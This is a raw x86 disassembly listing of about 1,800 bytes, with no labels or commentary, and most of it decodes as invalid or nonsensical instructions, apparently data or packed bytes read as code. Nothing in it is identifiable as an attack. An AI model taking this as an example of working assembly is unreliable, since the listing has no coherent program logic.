  4a37d1:	test   BYTE PTR [esi+eax*4-0xc],dl
  4a37d5:	xor    edi,DWORD PTR [eax-0x72]
  4a37d8:	and    DWORD PTR [ebp-0x3cb1bdf],edx
  4a37de:	xor    eax,0xe790873
  4a37e3:	or     BYTE PTR [edi+0x42900436],0x2a
  4a37ea:	inc    ebx
  4a37eb:	enter  0x8837,0x38
  4a37ef:	retf   0xf210
  4a37f2:	sbb    al,0xc
  4a37f4:	xchg   ecx,eax
  4a37f5:	cmp    DWORD PTR [eax-0x6f78c37c],edx
  4a37fb:	cmp    dl,BYTE PTR [edx+edx*4]
  4a37fe:	cmp    ecx,edi
  4a3800:	and    DWORD PTR [edx+esi*1-0x6ce3c368],esp
  4a3807:	cmp    eax,0x210ca908
  4a380c:	mov    al,ds:0xc8432a3e
  4a3811:	jae    0x4a3837
  4a3813:	xchg   esp,eax
  4a3814:	aas    
  4a3815:	test   al,0x40
  4a3817:	and    ebp,ecx
  4a3819:	adc    BYTE PTR [ebx],dl
  4a381b:	call   DWORD PTR [ebp-0x2def32bf]
  4a3821:	or     al,0x95
  4a3823:	inc    edx
  4a3824:	xchg   esi,eax
  4a3825:	inc    ebx
  4a3826:	adc    dl,dl
  4a3828:	or     al,0x21
  4a382a:	xchg   esi,eax
  4a382b:	inc    esp
  4a382c:	ror    BYTE PTR [ecx+eiz*1],cl
  4a382f:	int    0x97
  4a3831:	inc    ebp
  4a3832:	xchg   edi,eax
  4a3833:	inc    esi
  4a3834:	or     al,0x21
  4a3836:	int    0x10
  4a3838:	cwde   
  4a3839:	inc    edi
  4a383a:	cwde   
  4a383b:	and    ebp,ecx
  4a383d:	adc    dl,dl
  4a383f:	dec    eax
  4a3840:	cdq    
  4a3841:	dec    ecx
  4a3842:	int    0x10
  4a3844:	ror    BYTE PTR [ecx+ebx*4],cl
  4a3847:	dec    edx
  4a3848:	call   0x9a21:0xcd2104b
  4a384f:	dec    esp
  4a3850:	ror    BYTE PTR [ecx+eiz*1],cl
  4a3853:	int    0x9b
  4a3855:	dec    ebp
  4a3856:	fwait
  4a3857:	dec    esi
  4a3858:	or     al,0x21
  4a385a:	int    0x10
  4a385c:	pushf  
  4a385d:	dec    edi
  4a385e:	pushf  
  4a385f:	and    ebp,ecx
  4a3861:	adc    dl,dl
  4a3863:	push   eax
  4a3864:	popf   
  4a3865:	push   ecx
  4a3866:	int    0x10
  4a3868:	ror    BYTE PTR [ebx*4+0x10539e52],cl
  4a386f:	ror    BYTE PTR [ecx+eiz*1],cl
  4a3872:	sahf   
  4a3873:	push   esp
  4a3874:	ror    BYTE PTR [ecx+eiz*1],cl
  4a3877:	int    0x9f
  4a3879:	push   ebp
  4a387a:	mov    al,ds:0xcd210c56
  4a387f:	adc    BYTE PTR [eax-0x32de5ea9],ah
  4a3885:	adc    dl,dl
  4a3887:	pop    eax
  4a3888:	mov    eax,ds:0xd210cd59
  4a388d:	or     al,0xa2
  4a388f:	pop    edx
  4a3890:	mov    ds:0xcd2105b,al
  4a3895:	and    DWORD PTR [ebx+0x210cd25c],esp
  4a389b:	int    0xa3
  4a389d:	pop    ebp
  4a389e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a389f:	pop    esi
  4a38a0:	or     al,0x21
  4a38a2:	int    0x10
  4a38a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a38a5:	pop    edi
  4a38a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a38a7:	and    ebp,ecx
  4a38a9:	adc    dl,dl
  4a38ab:	pusha  
  4a38ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a38ad:	popa   
  4a38ae:	int    0x10
  4a38b0:	ror    BYTE PTR [esi+eiz*4],cl
  4a38b3:	bound  esp,QWORD PTR [esi+0xde42163]
  4a38b9:	and    DWORD PTR [edi-0x6a189bc6],esp
  4a38bf:	sub    al,0x95
  4a38c1:	mov    esp,0x84a84065
  4a38c6:	push   esp
  4a38c7:	xchg   BYTE PTR [eax-0x6a983b9a],dl
  4a38cd:	and    esp,esp
  4a38cf:	cmp    DWORD PTR [eax-0x57],ecx
  4a38d2:	push   0x790869cc
  4a38d7:	push   cs
  4a38d8:	and    DWORD PTR [eax-0x56],edx
  4a38db:	push   0xffffff9e
  4a38dd:	inc    ebx
  4a38de:	dec    eax
  4a38df:	gs aam 0x6b
  4a38e2:	pop    eax
  4a38e3:	stos   DWORD PTR es:[edi],eax
  4a38e4:	ins    BYTE PTR es:[edi],dx
  4a38e5:	adc    BYTE PTR [edx+0x19],dl
  4a38e8:	inc    edx
  4a38e9:	fsubr  QWORD PTR [ebp+0x54]
  4a38ec:	xchg   BYTE PTR [eax+0x6eac60e7],dl
  4a38f2:	in     al,0x6f
  4a38f4:	and    esp,esp
  4a38f6:	cmp    DWORD PTR [eax+ebp*2+0xe7970ad],eax
  4a38fd:	and    DWORD PTR [ebp-0x518f8e14],edx
  4a3903:	jb     0x4a3948
  4a3905:	dec    eax
  4a3906:	gs or  ah,dh
  4a3909:	jae    0x4a3983
  4a390b:	push   edx
  4a390c:	sbb    DWORD PTR [edx-0x62],eax
  4a390f:	scas   eax,DWORD PTR es:[edi]
  4a3910:	je     0x4a390e
  4a3912:	jne    0x4a389b
  4a3914:	nop
  4a3915:	out    0x10,eax
  4a3917:	xor    BYTE PTR [eax-0x5b4efb8a],0x32
  4a391e:	test   BYTE PTR [edi+esi*2],bh
  4a3921:	mov    BYTE PTR [eax+0xc],bh
  4a3924:	and    edi,ecx
  4a3926:	and    DWORD PTR [edx+esi*4],ecx
  4a3929:	jns    0x4a38bb
  4a392b:	enter  0x873,0xa9
  4a392f:	jp     0x4a3945
  4a3931:	mov    bl,0x7b
  4a3933:	sbb    al,0x42
  4a3935:	sub    al,BYTE PTR [ebx-0x68]
  4a3938:	jl     0x4a3956
  4a393a:	mov    ah,0x90
  4a393c:	retf   0xf210
  4a393f:	jge    0x4a38e1
  4a3941:	jle    0x4a3975
  4a3943:	test   BYTE PTR [edi+eax*4],bh
  4a3946:	and    al,0xb5
  4a3948:	jg     0x4a38f2
  4a394a:	and    edi,ecx
  4a394c:	and    DWORD PTR [eax+eax*4+0x7381b62c],esp
  4a3953:	or     BYTE PTR [ecx+0x3482b00c],ch
  4a3959:	mov    bh,0x42
  4a395b:	sub    al,BYTE PTR [ebx-0x38]
  4a395e:	cmp    DWORD PTR [eax-0xdef357c],0x1c
  4a3965:	cmp    al,0xb8
  4a3967:	test   eax,eax
  4a3969:	test   BYTE PTR [edi+eax*4],bh
  4a396c:	nop
  4a396d:	xchg   BYTE PTR [ecx+edi*4-0x79],al
  4a3971:	iret   
  4a3972:	and    DWORD PTR [edx+esi*1-0x45b37738],esp
  4a3979:	mov    DWORD PTR [eax],ecx
  4a397b:	test   eax,0x8ad0210c
  4a3980:	sub    al,BYTE PTR [ebx-0x38]
  4a3983:	jae    0x4a39d9
  4a3985:	mov    ebx,0x108cd88b
  4a398a:	repnz sbb al,0x42
  4a398d:	pop    esp
  4a398e:	mov    esp,0x90873c8d
  4a3993:	retf   0x8ee0
  4a3996:	fs mov ebp,0x32a4218f
  4a399c:	test   al,ch
  4a399e:	nop
  4a399f:	test   eax,0x6ccf210c
  4a39a4:	mov    esi,0x4392f091
  4a39a9:	enter  0x873,0x74
  4a39ad:	mov    edi,0x1cf2f893
  4a39b2:	inc    edx
  4a39b3:	sub    dl,BYTE PTR [esp+edi*2-0x6f796a40]
  4a39ba:	out    0x10,eax
  4a39bc:	add    cl,al
  4a39be:	xchg   esi,eax
  4a39bf:	test   ah,ah
  4a39c1:	cmp    DWORD PTR [esp+edx*2-0x673df769],eax
  4a39c8:	push   cs
  4a39c9:	and    DWORD PTR [ebp+0x10998c21],edx
  4a39cf:	ret    
  4a39d0:	dec    eax
  4a39d1:	or     BYTE PTR gs:[ecx-0x66],bh
  4a39d5:	xchg   esp,eax
  4a39d6:	fwait
  4a39d7:	sbb    DWORD PTR [edx-0x62],eax
  4a39da:	inc    ebx
  4a39db:	sbb    ah,al
  4a39dd:	pushf  
  4a39de:	pushf  
  4a39df:	nop
  4a39e0:	out    0x10,eax
  4a39e2:	push   edx
  4a39e3:	popf   
  4a39e4:	and    ch,al
  4a39e6:	sahf   
  4a39e7:	cmp    DWORD PTR [esp+edx*2+0x289fa486],eax
  4a39ee:	(bad)  
  4a39ef:	and    DWORD PTR [ebp-0x535f1bdf],edx
  4a39f5:	mov    eax,ds:0xe790865
  4a39fa:	xor    bh,al
  4a39fc:	mov    ds:0x439e42b4,al
  4a3a01:	dec    eax
  4a3a02:	mov    ds:0xe7a4c838,eax
  4a3a07:	adc    BYTE PTR [edx+0x19],dl
  4a3a0a:	mov    esp,0x84c940a5
  4a3a0f:	push   esp
  4a3a10:	xchg   BYTE PTR [eax-0x6a583b5a],dl
  4a3a16:	and    esp,esp
  4a3a18:	cmp    DWORD PTR [eax-0x36],ecx
  4a3a1b:	test   al,0xcc
  4a3a1d:	test   eax,0x210e7908
  4a3a22:	push   eax
  4a3a23:	retf   
  4a3a24:	stos   BYTE PTR es:[edi],al
  4a3a25:	sahf   
  4a3a26:	inc    ebx
  4a3a27:	dec    eax
  4a3a28:	gs aam 0xab
  4a3a2b:	pop    eax
  4a3a2c:	int3   
  4a3a2d:	lods   al,BYTE PTR ds:[esi]
  4a3a2e:	adc    BYTE PTR [edx+0x19],dl
  4a3a31:	inc    edx
  4a3a32:	fsubr  QWORD PTR [ebp-0x186f79ac]
  4a3a38:	pusha  
  4a3a39:	int    0xae
  4a3a3b:	in     al,0xaf
  4a3a3d:	and    esp,esp
  4a3a3f:	cmp    DWORD PTR [eax+ebp*2+0xe79b0ce],eax
  4a3a46:	and    DWORD PTR [ebp-0x308f4e14],edx
  4a3a4c:	mov    dl,0x43
  4a3a4e:	dec    eax
  4a3a4f:	gs or  ah,dh
  4a3a52:	mov    bl,0x78
  4a3a54:	push   edx
  4a3a55:	sbb    DWORD PTR [edx-0x62],eax
  4a3a58:	shl    BYTE PTR [esp+edi*8-0x186f784b],1
  4a3a5f:	adc    BYTE PTR [eax-0x2dfb492f],al
  4a3a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3a66:	xor    al,BYTE PTR [esp+edi*1+0xcb888b7]
  4a3a6d:	and    edi,ecx
  4a3a6f:	and    DWORD PTR [ebx+edx*8],ecx
  4a3a72:	mov    ecx,0x873c890
  4a3a77:	test   eax,0xbbd414ba
  4a3a7c:	sbb    al,0x42
  4a3a7e:	sub    al,BYTE PTR [ebx-0x68]
  4a3a81:	mov    esp,0xca90d51c
  4a3a86:	adc    dl,dh
  4a3a88:	mov    ebp,0x8432bea0
  4a3a8d:	cmp    al,0x87
  4a3a8f:	and    al,0xd6
  4a3a91:	mov    edi,0x21cf21a8
  4a3a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3a97:	shr    BYTE PTR [edi+edx*8],0xc1
  4a3a9b:	jae    0x4a3aa5
  4a3a9d:	test   eax,0x34c2b00c
  4a3aa2:	fadd   DWORD PTR [edx+0x2a]
  4a3aa5:	inc    ebx
  4a3aa6:	enter  0xb8c3,0xc4
  4a3aaa:	retf   0xf210
  4a3aad:	sbb    al,0x3c
  4a3aaf:	fld    st(5)
  4a3ab1:	rol    BYTE PTR [esp+edi*1+0x44c69087],0xda
  4a3ab9:	(bad)  
  4a3aba:	iret   
  4a3abb:	and    DWORD PTR [edx+esi*1-0x24b33738],esp
  4a3ac2:	leave  
  4a3ac3:	or     BYTE PTR [ecx-0x352fdef4],ch
  4a3ac9:	sub    al,BYTE PTR [ebx-0x38]
  4a3acc:	jae    0x4a3b22
  4a3ace:	fmul   st(3),st
  4a3ad0:	fmul   st,st(4)
  4a3ad2:	adc    dl,dh
  4a3ad4:	sbb    al,0x42
  4a3ad6:	pop    esp
  4a3ad7:	(bad)  
  4a3ad9:	cmp    al,0x87
  4a3adb:	nop
  4a3adc:	retf   0xcee0
  4a3adf:	fs fmulp st(7),st
  4a3ae2:	and    DWORD PTR [edx+esi*1-0x562f177c],esp
  4a3ae9:	or     al,0x21
  4a3aeb:	iret   
  4a3aec:	ins    BYTE PTR es:[edi],dx
  4a3aed:	(bad)  
  4a3aef:	lock rol BYTE PTR [ebx-0x38],cl
  4a3af3:	jae    0x4a3afd
  4a3af5:	je     0x4a3ad7
  4a3af7:	sar    eax,cl
  4a3af9:	repnz sbb al,0x42
  4a3afc:	sub    dl,ah
  4a3afe:	jl     0x4a3ae1
  4a3b00:	aad    0x86
  4a3b02:	nop
  4a3b03:	out    0x10,eax
  4a3b05:	add    dl,ah
  4a3b07:	(bad)  
  4a3b08:	test   ah,ah
  4a3b0a:	cmp    DWORD PTR [esp+edx*2-0x271cf729],eax
  4a3b11:	push   cs
  4a3b12:	and    DWORD PTR [ebp+0x10d98c21],edx
  4a3b18:	in     al,0x48
  4a3b1a:	or     BYTE PTR gs:[ecx-0x26],bh
  4a3b1e:	xchg   esp,eax
  4a3b1f:	fistp  DWORD PTR [ecx]
  4a3b21:	inc    edx
  4a3b22:	sahf   
  4a3b23:	inc    ebx
  4a3b24:	sbb    ch,ah
  4a3b26:	fcomp  QWORD PTR [eax+edx*4-0x22adef19]
  4a3b2d:	and    dh,ah
  4a3b2f:	fidivr WORD PTR [ecx]
  4a3b31:	test   BYTE PTR [esi+eax*4-0x5c],dl
  4a3b35:	fild   QWORD PTR [eax]
  4a3b37:	out    0x21,eax
  4a3b39:	xchg   ebp,eax
  4a3b3a:	and    esp,esp
  4a3b3c:	loopne 0x4a3aea
  4a3b3e:	loope  0x4a3ba5
  4a3b40:	or     BYTE PTR [ecx+0xe],bh
  4a3b43:	xor    al,ch
  4a3b45:	loop   0x4a3afb
  4a3b47:	inc    edx
  4a3b48:	sahf   
  4a3b49:	inc    ebx
  4a3b4a:	dec    eax
  4a3b4b:	jecxz  0x4a3b85
  4a3b4d:	jmp    0x525b2336
  4a3b52:	sbb    DWORD PTR [ebp+eiz*8+0x5484ea40],edi
  4a3b59:	xchg   BYTE PTR [eax-0x6a183b1a],dl
  4a3b5f:	and    esp,esp
  4a3b61:	cmp    DWORD PTR [eax-0x15],ecx
  4a3b64:	call   0x79532535
  4a3b69:	push   cs
  4a3b6a:	and    DWORD PTR [eax-0x14],edx
  4a3b6d:	jmp    0xebd4:0x6548439e
  4a3b74:	pop    eax
  4a3b75:	in     eax,dx
  4a3b76:	in     al,dx
  4a3b77:	adc    BYTE PTR [edx+0x19],dl
  4a3b7a:	inc    edx
  4a3b7b:	fsub   st(5),st
  4a3b7d:	push   esp
  4a3b7e:	xchg   BYTE PTR [eax-0x11119f19],dl
  4a3b84:	in     al,0xef
  4a3b86:	and    esp,esp
  4a3b88:	cmp    DWORD PTR [eax+ebp*2+0xe79f0ef],eax
  4a3b8f:	and    DWORD PTR [ebp-0xf8f0e14],edx
  4a3b95:	repnz inc ebx
  4a3b97:	dec    eax
  4a3b98:	gs or  ah,dh
  4a3b9b:	repz js 0x4a3bf0
  4a3b9e:	sbb    DWORD PTR [edx-0x62],eax
  4a3ba1:	icebp  
  4a3ba2:	hlt    
  4a3ba3:	cld    
  4a3ba4:	cmc    
  4a3ba5:	xchg   DWORD PTR [eax-0xd7fef19],edx
  4a3bab:	test   BYTE PTR [ebx+esi*8],0xa4
  4a3baf:	xor    al,BYTE PTR [esp+edi*1+0xcf888f7]
  4a3bb6:	and    edi,ecx
  4a3bb8:	and    DWORD PTR [esp+esi*8],ecx
  4a3bbb:	stc    
  4a3bbc:	nop
  4a3bbd:	enter  0x873,0xa9
  4a3bc1:	cli    
  4a3bc2:	adc    al,0xf5
  4a3bc4:	sti    
  4a3bc5:	sbb    al,0x42
  4a3bc7:	sub    al,BYTE PTR [ebx-0x68]
  4a3bca:	cld    
  4a3bcb:	sbb    al,0xf6
  4a3bcd:	nop
  4a3bce:	retf   0xf210
  4a3bd1:	std    
  4a3bd2:	mov    al,ds:0x3c8432fe
  4a3bd7:	xchg   DWORD PTR [edi+esi*8],esp
  4a3bda:	jmp    FWORD PTR [eax-0x4dfa1870]
  4a3be0:	add    BYTE PTR [ebx],cl
  4a3be2:	sub    al,0xf8
  4a3be4:	add    DWORD PTR [ecx],edi
  4a3be6:	test   BYTE PTR [esi+eax*4-0x50],dl
  4a3bea:	add    dh,BYTE PTR [ecx+edi*8]
  4a3bed:	and    DWORD PTR [ebp-0x47fc1bdf],edx
  4a3bf3:	add    al,0x65
  4a3bf5:	or     BYTE PTR [ecx+0xe],bh
  4a3bf8:	cmp    al,0xfa
  4a3bfa:	add    eax,0x439e42c0
  4a3bff:	dec    eax
  4a3c00:	push   es
  4a3c01:	inc    esp
  4a3c02:	sti    
  4a3c03:	pop    es
  4a3c04:	out    0x10,eax
  4a3c06:	push   edx
  4a3c07:	sbb    eax,ecx
  4a3c09:	or     BYTE PTR [esp+edi*8-0x7c],cl
  4a3c0d:	push   esp
  4a3c0e:	xchg   BYTE PTR [eax-0x6af52ff7],dl
  4a3c14:	and    esp,esp
  4a3c16:	cmp    DWORD PTR [ebp+edi*8+0xb],edx
  4a3c1a:	fmul   DWORD PTR [eax+ecx*1]
  4a3c1d:	jns    0x4a3c2d
  4a3c1f:	and    DWORD PTR [esi+edi*8+0xd],ebx
  4a3c23:	sahf   
  4a3c24:	inc    ebx
  4a3c25:	dec    eax
  4a3c26:	gs loopne 0x4a3c37
  4a3c29:	dec    DWORD PTR fs:[edi]
  4a3c2c:	adc    BYTE PTR [edx+0x19],dl
  4a3c2f:	inc    edx
  4a3c30:	call   0x488d6645
  4a3c35:	rep ins BYTE PTR es:[edi],dx
  4a3c37:	add    BYTE PTR [esi+0x11],al
  4a3c3a:	lock adc dl,BYTE PTR [eax]
  4a3c3d:	repnz sbb al,0x42
  4a3c40:	je     0x4a3c43
  4a3c42:	adc    edi,DWORD PTR [edi+eax*4]
  4a3c45:	nop
  4a3c46:	retf   0x14f8
  4a3c49:	jl     0x4a3c4d
  4a3c4b:	adc    eax,0x8439e421
  4a3c50:	add    BYTE PTR [ebx],al
  4a3c52:	push   ss
  4a3c53:	jns    0x4a3c63
  4a3c55:	and    DWORD PTR [ebp+0x4081784],edx
  4a3c5b:	sbb    BYTE PTR [ebx+0x48],al
  4a3c5e:	or     BYTE PTR gs:[ecx+ebx*1+0x42195210],cl
  4a3c66:	sahf   
  4a3c67:	add    eax,0x861b941a
  4a3c6c:	nop
  4a3c6d:	out    0x10,eax
  4a3c6f:	sbb    BYTE PTR [esi],al
  4a3c71:	sbb    al,0x9c
  4a3c73:	in     al,0x39
  4a3c75:	test   BYTE PTR [ebp+ebx*1+0x20],dl
  4a3c79:	pop    es
  4a3c7a:	push   ds
  4a3c7b:	push   cs
  4a3c7c:	and    DWORD PTR [ebp+0x281fa421],edx
  4a3c82:	or     BYTE PTR [eax+0x65],cl
  4a3c85:	or     BYTE PTR [ecx+0x20],bh
  4a3c88:	lods   al,BYTE PTR ds:[esi]
  4a3c89:	and    DWORD PTR [ecx],ebx
  4a3c8b:	inc    edx
  4a3c8c:	sahf   
  4a3c8d:	inc    ebx
  4a3c8e:	xor    BYTE PTR [ecx],cl
  4a3c90:	and    dh,BYTE PTR [eax+edx*4+0x235210e7]
  4a3c97:	cmp    BYTE PTR [edx],cl
  4a3c99:	and    al,0x39
  4a3c9b:	test   BYTE PTR [esi+eax*4-0x44],dl
  4a3c9f:	and    eax,0x95210b40
  4a3ca4:	and    esp,esp
  4a3ca6:	les    esp,FWORD PTR es:[edi]
  4a3ca9:	or     BYTE PTR gs:[ecx+0xe],bh
  4a3cad:	dec    eax
  4a3cae:	or     al,0x28
  4a3cb0:	int3   
  4a3cb1:	inc    edx
  4a3cb2:	sahf   
  4a3cb3:	inc    ebx
  4a3cb4:	dec    eax
  4a3cb5:	sub    DWORD PTR [eax+0xd],edx
  4a3cb8:	sub    ah,bh
  4a3cba:	adc    BYTE PTR [edx+0x19],dl
  4a3cbd:	aam    0x2b
  4a3cbf:	pop    eax
  4a3cc0:	push   cs
  4a3cc1:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a3cc5:	sub    al,0xdc
  4a3cc7:	sub    eax,0x39e42195
  4a3ccc:	pusha  
  4a3ccd:	ucomiss xmm4,xmm4
  4a3cd0:	das    
  4a3cd1:	or     BYTE PTR [ecx+0xe],bh
  4a3cd4:	and    DWORD PTR [eax+0x10],ebp
  4a3cd7:	xor    BYTE PTR [esi-0x139ab7bd],bl
  4a3cdd:	xor    DWORD PTR [eax+0x11],esi
  4a3ce0:	xor    dl,BYTE PTR [eax]
  4a3ce2:	push   edx
  4a3ce3:	sbb    DWORD PTR [edx-0xc],eax
  4a3ce6:	xor    edx,DWORD PTR [esi+eax*4-0x70]
  4a3cea:	out    0x78,eax
  4a3cec:	adc    dh,BYTE PTR [esp+edi*8]
  4a3cef:	xor    eax,0x8439e421
  4a3cf4:	adc    BYTE PTR [ebx],0x36
  4a3cf7:	test   eax,0x4cf210c
  4a3cfc:	adc    al,0x37
  4a3cfe:	mov    BYTE PTR [eax],bh
  4a3d00:	inc    ebx
  4a3d01:	enter  0x873,0xc
  4a3d05:	adc    eax,0x1cf29039
  4a3d0a:	inc    edx
  4a3d0b:	sub    bh,BYTE PTR [edx]
  4a3d0d:	adc    al,0x16
  4a3d0f:	cmp    eax,DWORD PTR [edi-0x67ef3570]
  4a3d15:	cmp    al,0x1c
  4a3d17:	pop    ss
  4a3d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3d19:	xor    al,BYTE PTR [esp+edi*1+0xc3ea03d]
  4a3d20:	and    edi,ecx
  4a3d22:	and    DWORD PTR [eax+ebx*1],esp
  4a3d25:	aas    
  4a3d26:	test   al,0xc8
  4a3d28:	jae    0x4a3d32
  4a3d2a:	test   eax,0x41192c40
  4a3d2f:	sbb    al,0x42
  4a3d31:	sub    al,BYTE PTR [ebx-0x50]
  4a3d34:	inc    edx
  4a3d35:	xor    al,0x1a
  4a3d37:	nop
  4a3d38:	retf   0xf210
  4a3d3b:	inc    ebx
  4a3d3c:	mov    eax,0x3c843244
  4a3d41:	xchg   DWORD PTR [ebx+ebx*1],edi
  4a3d44:	inc    ebp
  4a3d45:	shl    BYTE PTR [ecx],0xcf
  4a3d48:	and    DWORD PTR [esi+eax*2+0x73471c44],esp
  4a3d4f:	or     BYTE PTR [ecx+0x4c48c80c],ch
  4a3d55:	sbb    eax,0xc8432a42
  4a3d5a:	dec    ecx
  4a3d5b:	ror    BYTE PTR [edx-0x36],1
  4a3d5e:	adc    dl,dh
  4a3d60:	sbb    al,0x54
  4a3d62:	push   ds
  4a3d63:	dec    ebx
  4a3d64:	fadd   DWORD PTR [esp+edi*1+0x5c4c9087]
  4a3d6b:	pop    ds
  4a3d6c:	dec    ebp
  4a3d6d:	iret   
  4a3d6e:	and    DWORD PTR [edx+esi*1+0x20644ee0],esp
  4a3d75:	dec    edi
  4a3d76:	dec    esp
  4a3d77:	test   al,0xc
  4a3d79:	and    eax,ebp
  4a3d7b:	push   eax
  4a3d7c:	push   DWORD PTR [ebx]
  4a3d7e:	test   BYTE PTR [ebx+eax*2],dh
  4a3d81:	and    DWORD PTR [ecx+0x21],edx
  4a3d84:	test   BYTE PTR [ebx+eax*2],dh
  4a3d87:	dec    eax
  4a3d88:	push   edx
  4a3d89:	and    dl,BYTE PTR [ebx+0x34]
  4a3d8c:	inc    ebx
  4a3d8d:	dec    eax
  4a3d8e:	xor    esp,DWORD PTR [edx]
  4a3d90:	push   esp
  4a3d91:	and    edx,DWORD PTR [ebp+0x43]
  4a3d94:	dec    eax
  4a3d95:	xor    eax,DWORD PTR [esp+0x33482456]
  4a3d9c:	test   BYTE PTR [edi+edx*2],dh
  4a3d9f:	and    eax,0x34843358
  4a3da4:	inc    ebx
  4a3da5:	and    eax,0x34842659
  4a3daa:	inc    ebx
  4a3dab:	dec    eax
  4a3dac:	pop    edx
  4a3dad:	es pop ebx
  4a3daf:	xor    al,0x43
  4a3db1:	dec    eax
  4a3db2:	xor    esp,DWORD PTR [edi]
  4a3db4:	pop    esp
  4a3db5:	daa    
  4a3db6:	pop    ebp
  4a3db7:	inc    ebx
  4a3db8:	dec    eax
  4a3db9:	xor    eax,DWORD PTR [eax+ebp*1+0x3348285e]
  4a3dc0:	test   BYTE PTR [edi+ebx*2],dh
  4a3dc3:	sub    DWORD PTR [eax+0x33],esp
  4a3dc6:	test   BYTE PTR [ebx+eax*2],dh
  4a3dc9:	sub    DWORD PTR [ecx+0x2a],esp
  4a3dcc:	test   BYTE PTR [ebx+eax*2],dh
  4a3dcf:	dec    eax
  4a3dd0:	bound  ebp,QWORD PTR [edx]
  4a3dd2:	arpl   WORD PTR [ebx+eax*2],si
  4a3dd5:	dec    eax
  4a3dd6:	xor    ebp,DWORD PTR [ebx]
  4a3dd8:	sub    esp,DWORD PTR fs:[ebp+0x43]
  4a3ddc:	dec    eax
  4a3ddd:	xor    eax,DWORD PTR [esp+ebp*1+0x33482c66]
  4a3de4:	test   BYTE PTR [edi+eiz*2],dh
  4a3de7:	sub    eax,0x34843368
  4a3dec:	inc    ebx
  4a3ded:	sub    eax,0x34842e69
  4a3df2:	inc    ebx
  4a3df3:	dec    eax
  4a3df4:	push   0x2e
  4a3df6:	imul   esi,DWORD PTR [ebx+eax*2],0x48
  4a3dfa:	xor    ebp,DWORD PTR [edi]
  4a3dfc:	ins    BYTE PTR es:[edi],dx
  4a3dfd:	das    
  4a3dfe:	ins    DWORD PTR es:[edi],dx
  4a3dff:	inc    ebx
  4a3e00:	dec    eax
  4a3e01:	xor    eax,DWORD PTR [eax+esi*1+0x3348306e]
  4a3e08:	test   BYTE PTR [edi+ebp*2],dh
  4a3e0b:	xor    DWORD PTR [eax+0x33],esi
  4a3e0e:	test   BYTE PTR [ebx+eax*2],dh
  4a3e11:	xor    DWORD PTR [ecx+0x32],esi
  4a3e14:	test   BYTE PTR [ebx+eax*2],dh
  4a3e17:	dec    eax
  4a3e18:	jb     0x4a3e4c
  4a3e1a:	jae    0x4a3e50
  4a3e1c:	inc    ebx
  4a3e1d:	dec    eax
  4a3e1e:	xor    esi,DWORD PTR [ebx]
  4a3e20:	je     0x4a3e55
  4a3e22:	jne    0x4a3e67
  4a3e24:	dec    eax
  4a3e25:	xor    eax,DWORD PTR [esp+esi*1+0x33483576]
  4a3e2c:	test   BYTE PTR [edi+esi*2],dh
  4a3e2f:	xor    eax,0x34843378
  4a3e34:	inc    ebx
  4a3e35:	ss jns 0x4a3e6e
  4a3e38:	test   BYTE PTR [ebx+eax*2],dh
  4a3e3b:	dec    eax
  4a3e3c:	jp     0x4a3e75
  4a3e3e:	jnp    0x4a3e74
  4a3e40:	inc    ebx
  4a3e41:	dec    eax
  4a3e42:	xor    esi,DWORD PTR [edi]
  4a3e44:	jl     0x4a3e7e
  4a3e46:	jge    0x4a3e8b
  4a3e48:	dec    eax
  4a3e49:	xor    eax,DWORD PTR [eax+edi*1+0x3348397e]
  4a3e50:	test   BYTE PTR [edi+edi*2],dh
  4a3e53:	cmp    DWORD PTR [eax+0x43348433],eax
  4a3e59:	cmp    al,BYTE PTR [ecx+0x4334843a]
  4a3e5f:	dec    eax
  4a3e60:	cmp    BYTE PTR [ebx],0x83
  4a3e63:	xor    al,0x43
  4a3e65:	dec    eax
  4a3e66:	xor    edi,DWORD PTR [ebx]
  4a3e68:	test   BYTE PTR [eax*4-0x7bccb7bd],bh
  4a3e6f:	cmp    al,0x86
  4a3e71:	cmp    eax,0x34843348
  4a3e76:	xchg   DWORD PTR ds:0x34843388,edi
  4a3e7c:	inc    ebx
  4a3e7d:	mov    DWORD PTR ds:[esi],edi
  4a3e80:	test   BYTE PTR [ebx+eax*2],dh
  4a3e83:	dec    eax
  4a3e84:	mov    bh,BYTE PTR [edi]
  4a3e86:	mov    esi,DWORD PTR [ebx+eax*2]
  4a3e89:	dec    eax
  4a3e8a:	xor    edi,DWORD PTR [edi]
  4a3e8c:	mov    WORD PTR [eax-0x73],es
  4a3e8f:	inc    ebx
  4a3e90:	dec    eax
  4a3e91:	xor    eax,DWORD PTR [eax+eax*2+0x3348418e]
  4a3e98:	test   BYTE PTR [edi+ecx*4],dh
  4a3e9b:	inc    ecx
  4a3e9c:	nop
  4a3e9d:	xor    eax,DWORD PTR [esp+esi*1+0x42914243]
  4a3ea4:	test   BYTE PTR [ebx+eax*2],dh
  4a3ea7:	dec    eax
  4a3ea8:	xchg   edx,eax
  4a3ea9:	inc    ebx
  4a3eaa:	xchg   ebx,eax
  4a3eab:	xor    al,0x43
  4a3ead:	dec    eax
  4a3eae:	xor    eax,DWORD PTR [ebx-0x6c]
  4a3eb1:	inc    esp
  4a3eb2:	xchg   ebp,eax
  4a3eb3:	inc    ebx
  4a3eb4:	dec    eax
  4a3eb5:	xor    eax,DWORD PTR [ebp+eax*2+0x33484596]
  4a3ebc:	test   BYTE PTR [edi+edx*4],dh
  4a3ebf:	inc    esi
  4a3ec0:	cwde   
  4a3ec1:	xor    eax,DWORD PTR [esp+esi*1+0x47994643]
  4a3ec8:	test   BYTE PTR [ebx+eax*2],dh
  4a3ecb:	dec    eax
  4a3ecc:	call   0x3348:0x43349b47
  4a3ed3:	dec    eax
  4a3ed4:	pushf  
  4a3ed5:	dec    eax
  4a3ed6:	popf   
  4a3ed7:	inc    ebx
  4a3ed8:	dec    eax
  4a3ed9:	xor    eax,DWORD PTR [ecx+ecx*2+0x3348499e]
  4a3ee0:	test   BYTE PTR [edi+ebx*4],dh
  4a3ee3:	dec    edx
  4a3ee4:	mov    al,ds:0x43348433
  4a3ee9:	dec    edx
  4a3eea:	mov    eax,ds:0x4334844b
  4a3eef:	dec    eax
